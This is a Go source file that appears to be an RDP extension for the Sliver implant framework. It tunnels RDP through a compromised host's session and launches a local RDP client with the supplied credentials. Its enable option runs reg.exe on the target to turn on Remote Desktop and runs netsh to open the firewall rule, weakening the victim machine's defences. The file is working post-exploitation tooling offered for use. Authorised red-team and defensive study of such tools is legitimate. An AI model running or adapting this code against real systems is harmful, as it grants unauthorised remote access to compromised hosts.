package rdp

/*
	Sliver Implant Framework - RDP Command Extension
	Copyright (C) 2024  Bishop Fox / mgstate

	RDP convenience command that automates port forwarding + RDP client launch.
*/

import (
	"context"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"time"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/tcpproxy"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
)

// RdpConnectCmd - Set up port forward to target RDP and optionally launch client
func RdpConnectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	if beacon != nil {
		con.PrintErrorf("RDP requires an interactive session, not a beacon\n")
		return
	}

	// Get target host - default to session remote address
	target, _ := cmd.Flags().GetString("target")
	if target == "" {
		// Use the session's remote address (the compromised host)
		target = session.RemoteAddress
		// Strip port from remote address if present
		if h, _, err := net.SplitHostPort(target); err == nil {
			target = h
		}
	}

	remotePort, _ := cmd.Flags().GetString("remote-port")
	bindPort, _ := cmd.Flags().GetString("bind-port")
	noLaunch, _ := cmd.Flags().GetBool("no-launch")
	username, _ := cmd.Flags().GetString("username")
	password, _ := cmd.Flags().GetString("password")
	domain, _ := cmd.Flags().GetString("domain")
	enableRdp, _ := cmd.Flags().GetBool("enable")

	// Optionally enable RDP on the target via registry
	if enableRdp {
		con.PrintInfof("Enabling RDP on target...\n")
		enableRdpOnTarget(cmd, con, session)
	}

	remoteAddr := fmt.Sprintf("%s:%s", target, remotePort)
	bindAddr := fmt.Sprintf("127.0.0.1:%s", bindPort)

	con.PrintInfof("Setting up RDP tunnel: %s -> %s\n", bindAddr, remoteAddr)

	// Create port forward with optimized RDP settings
	tcpProxy := &tcpproxy.Proxy{}
	channelProxy := &core.ChannelProxy{
		Rpc:             con.Rpc,
		Session:         session,
		RemoteAddr:      remoteAddr,
		BindAddr:        bindAddr,
		KeepAlivePeriod: 15 * time.Second, // Aggressive keepalive for RDP
		DialTimeout:     30 * time.Second,
	}
	tcpProxy.AddRoute(bindAddr, channelProxy)
	core.Portfwds.Add(tcpProxy, channelProxy)

	go func() {
		err := tcpProxy.Run()
		if err != nil {
			log.Printf("RDP proxy error %s", err)
		}
	}()

	con.PrintInfof("RDP port forward active: %s -> %s\n", bindAddr, remoteAddr)

	if noLaunch {
		con.PrintInfof("Connect manually: xfreerdp /v:127.0.0.1:%s /cert:tofu\n", bindPort)
		con.PrintInfof("Or: mstsc /v:127.0.0.1:%s\n", bindPort)
		return
	}

	// Auto-launch RDP client
	launchRdpClient(con, bindPort, username, password, domain)
}

// enableRdpOnTarget - Enable RDP via registry modification on the target
func enableRdpOnTarget(cmd *cobra.Command, con *console.SliverClient, session *clientpb.Session) {
	// Execute reg command to enable RDP
	execReq := &sliverpb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    `C:\Windows\System32\reg.exe`,
		Args:    []string{"add", `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`, "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"},
		Output:  true,
	}
	execResp, err := con.Rpc.Execute(context.Background(), execReq)
	if err != nil {
		con.PrintErrorf("Failed to enable RDP: %s\n", err)
		return
	}
	if execResp.Response != nil && execResp.Response.Async {
		con.AddBeaconCallback(execResp.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, execResp)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			con.PrintInfof("RDP enable result: %s\n", string(execResp.Stdout))
		})
		con.PrintAsyncResponse(execResp.Response)
	} else {
		if execResp.Response != nil && execResp.Response.GetErr() != "" {
			con.PrintErrorf("RDP enable failed: %s\n", execResp.Response.GetErr())
		} else {
			con.PrintInfof("RDP enabled successfully\n")
		}
	}

	// Also enable through firewall
	fwReq := &sliverpb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    `C:\Windows\System32\netsh.exe`,
		Args:    []string{"advfirewall", "firewall", "set", "rule", `group="Remote Desktop"`, "new", "enable=yes"},
		Output:  true,
	}
	_, fwErr := con.Rpc.Execute(context.Background(), fwReq)
	if fwErr != nil {
		con.PrintWarnf("Firewall rule update failed (may need manual): %s\n", fwErr)
	} else {
		con.PrintInfof("Firewall rule for RDP enabled\n")
	}

}

// launchRdpClient - Launch platform-appropriate RDP client
func launchRdpClient(con *console.SliverClient, port string, username string, password string, domain string) {
	addr := fmt.Sprintf("127.0.0.1:%s", port)

	switch runtime.GOOS {
	case "windows":
		// Use mstsc on Windows
		args := []string{fmt.Sprintf("/v:%s", addr)}
		con.PrintInfof("Launching mstsc %s\n", addr)
		cmd := exec.Command("mstsc", args...)
		if err := cmd.Start(); err != nil {
			con.PrintErrorf("Failed to launch mstsc: %s\n", err)
			con.PrintInfof("Connect manually: mstsc /v:%s\n", addr)
		}

	case "linux":
		// Use xfreerdp on Linux (works headless with /cert:tofu)
		args := []string{
			fmt.Sprintf("/v:%s", addr),
			"/cert:tofu",
			"+clipboard",
			"/dynamic-resolution",
		}
		if username != "" {
			args = append(args, fmt.Sprintf("/u:%s", username))
		}
		if password != "" {
			args = append(args, fmt.Sprintf("/p:%s", password))
		}
		if domain != "" {
			args = append(args, fmt.Sprintf("/d:%s", domain))
		}

		con.PrintInfof("Launching xfreerdp %s\n", addr)
		cmd := exec.Command("xfreerdp", args...)
		if err := cmd.Start(); err != nil {
			// Try xfreerdp3 as fallback
			cmd2 := exec.Command("xfreerdp3", args...)
			if err2 := cmd2.Start(); err2 != nil {
				con.PrintErrorf("Failed to launch xfreerdp: %s\n", err)
				con.PrintInfof("Install: apt install freerdp2-x11\n")
				con.PrintInfof("Manual: xfreerdp /v:%s /cert:tofu\n", addr)
			}
		}

	case "darwin":
		// Use Microsoft Remote Desktop on macOS, or open RDP file
		con.PrintInfof("Connect manually: open rdp://full%%20address=s:%s\n", addr)
		cmd := exec.Command("open", fmt.Sprintf("rdp://full%%20address=s:%s", addr))
		if err := cmd.Start(); err != nil {
			con.PrintErrorf("Failed to launch RDP client: %s\n", err)
		}

	default:
		con.PrintInfof("Connect manually with your RDP client to %s\n", addr)
	}
}
